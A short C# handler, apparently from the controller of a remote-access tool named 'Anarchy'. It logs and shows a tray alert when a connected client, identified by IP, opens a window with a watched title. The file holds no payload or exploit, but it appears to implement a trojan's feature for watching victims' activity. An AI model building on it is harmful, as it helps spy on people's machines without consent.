using System.Drawing;
using Anarchy.Auth;
using Anarchy.Networking;
using Anarchy.Properties;

namespace Anarchy.Handlers
{
    public class HandleReportWindow
    {
        public HandleReportWindow(Clients client, string title)
        {
            new HandleLogs().Addmsg("Client " + client.Ip + " opened [" + title + "]", Color.Blue);
            if (Settings.Default.Notification)
            {
                Login.form1.notifyIcon1.BalloonTipText = "Client " + client.Ip + " opened [" + title + "]";
                Login.form1.notifyIcon1.ShowBalloonTip(100);
            }
        }
    }
}
